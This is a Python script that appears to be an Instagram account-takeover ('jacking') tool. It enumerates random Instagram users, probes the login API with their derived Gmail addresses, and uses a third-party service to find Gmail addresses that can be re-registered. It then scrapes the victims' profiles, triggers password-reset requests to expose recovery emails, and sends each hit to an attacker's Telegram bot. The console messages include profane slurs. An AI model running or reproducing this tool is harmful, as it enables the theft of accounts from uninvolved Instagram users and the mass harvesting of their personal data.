try:
  import threading
  import json
  import mechanize
  import os
  import random
  import re
  import requests
  import secrets
  import time
  import pyfiglet
  from telebot import types
  import telebot
  from pyfiglet import figlet_format
  from user_agent import generate_user_agent
  from uuid import uuid4
except:
  os.system('pip install mechanize')
  os.system('pip install requests')
  os.system('pip install secrets')
  os.system('pip install time')
  os.system('pip install telebot')
  os.system('pip install user_agent')
  os.system('pip install uuid')
  os.system('pip install pyfiglet')
  os.system('pip install threading')
  os.system('clear')
  import threading
  import json
  import mechanize
  import os
  import random
  import re
  import requests
  import secrets
  import time
  import pyfiglet
  from telebot import types
  import telebot
  from pyfiglet import figlet_format
  from user_agent import generate_user_agent
  from uuid import uuid4
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #RED
X = '\033[1;33m' #YELLOW
Z1 = '\033[2;31m' #Second red
F = '\033[2;32m' #green
A = '\033[2;34m'#blue
C = '\033[2;35m' #rosy
B = '\033[2;36m'#sleepy
Y = '\033[1;34m' #light blue
M = '\x1b[1;37m'#White
S = '\033[1;33m'
br = pyfiglet.figlet_format("GOJO HI KEHDE")
IDX = '''
▀█▀ ░█▀▀▄ 　 ▄ 
░█─ ░█─░█ 　 ─ 
▄█▄ ░█▄▄▀ 　 ▀   '''
TOKENX = '''
▀▀█▀▀ ░█▀▀▀█ ░█─▄▀ ░█▀▀▀ ░█▄─░█ 　 ▄ 
─░█── ░█──░█ ░█▀▄─ ░█▀▀▀ ░█░█░█ 　 ─ 
─░█── ░█▄▄▄█ ░█─░█ ░█▄▄▄ ░█──▀█ 　 ▀   '''
def Chaos():	
  Chaotic = (f'''{C}''' + br )
  for o in Chaotic.splitlines():
    time.sleep(0.05)
    print(o)
Chaos()
print(Z1+'⋘─────━**━─────⋙')
tok=input(X+TOKENX)
id=input(B+IDX)
print(Z1+'→→→𓆩 JACKING_GOD 𓆪‏→→→')
bb=[]
def em(user):
      global bb
      email=str(user)
      try:
               url = 'https://b.i.instagram.com/api/v1/accounts/login/'
               headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}

               uid = str(uuid4())
               data = {
'uuid':uid, 
'password':'zaidrupro12@', 
'username':email,
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'
      }

               try:
                re = requests.post(url,headers=headers,data=data).text
               except:
                print(Z+"Error In Communication")

               if ('"The username you entered ') in re:
                os.system('cls'if os.
 name=='net'else'clear')
                print(f"{S}Chuda Hua Insta Fr | {B}{email}")
               elif ('"bad_password"') in re:
                os.system('cls'if os.
 name=='net'else'clear')
                print(f"{F}Chuda Hua Mail Hai Brother| {B}{email}")
                email=email.split('@')[0]+'@gmail.com'
                try:
                  headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://127.0.0.1:5000',
    'Referer': 'http://127.0.0.1:5000/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
};data = {
    'data': email,
    'telegram':'@P_W_7',
    'version': '1',
    };re = requests.post('https://apigmail-23a439f3f7a6.herokuapp.com//zaid', headers=headers, data=data).text
                  if "Good" in re:
                        os.system('cls'if os.
 name=='net'else'clear');print(f"{F}Good Luck Lode Email Is Available {B}{email}")
                        try:
                          user=email.split('@')[0]
                          urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
                          he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}

                          re =requests.get(urlg, headers=he).json()
                          io = re['data']['user']['biography']
                          fol = re['data']['user']['edge_followed_by']['count']
                          fos = re['data']['user']['edge_follow']['count']
                          ido = re['data']['user']['id']
                          nam = re['data']['user']['full_name']
                          isp = re['data']['user']['is_private']
                          op = re['data']['user']['edge_owner_to_timeline_media']['count']
                          try:
                            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={ido}")
                            ree = re.json()
                            date = ree['date']
                          except:
                            date="Not Data"
                          heeee = {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'User-Agent': generate_user_agent(),
'Accept-Language': 'en-US',
'X-IG-Connection-Type': 'WIFI',
'X-IG-Capabilities': 'AQ==',
'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
      };daaa = {
'ig_sig_key_version': '4',
"user_id":ido};urr = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'

                          try:
                            reeee = requests.post(urr,headers=heeee,data=daaa).json()
                            rest = reeee['obfuscated_email']
                          except:
                            rest='No Rest'
                          ff =f'''
➣ 𓊆𝙋𝙧𝙞𝙢𝙞𝙪𝙢 𝙃𝙞𝙩 𓊇
→→→𓆩 Sir Gojo 𓆪‏→→→
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
By - @WASGOJO - @JACKING_GOD'''
                          print(ff);bb.append(ff);requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text="+str(ff))
                        except:
                          ff=f'''
Not info In Instagram
Email : {email}
Dev: @P_W_7''';requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text="+str(ff))
                  else:
                    os.system('cls'if os.
 name=='net'else'clear');print(f"{S}Chuda Hua Email Lund Pe| {B}{email}")

                except:
                   os.system('cls'if os.
 name=='net'else'clear')
                   print(Z+"Internet Use Karle Madherchod")
               else:
                os.system('cls'if os.
 name=='net'else'clear')
                print(f"{S}Chuda Hua Insta| {B}{email}")
               for e in bb:
                print(e)
      except:
               eerr+=1			
def zaid():
  while True:
    try:
      lsd=''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
      id=str(random.randrange(10000,739988755))
      headers = {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/0s9s/',
      'user-agent': str(generate_user_agent()),
      'x-fb-lsd': 'insta'+lsd,
  }
      data = {
      'lsd': 'insta'+lsd,
      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
      'doc_id': '7397388303713986',
  }
      user= requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
      user=user+'@gmail.com'
      if '_' in user:
        continue
      else:
        em(user)
    except:
      zaid() 
import threading;Threads=[] 
for i in range(50):
  x = threading.Thread(target=zaid);x.start();Threads.append(x)
  for zxn in Threads:
    zxn.join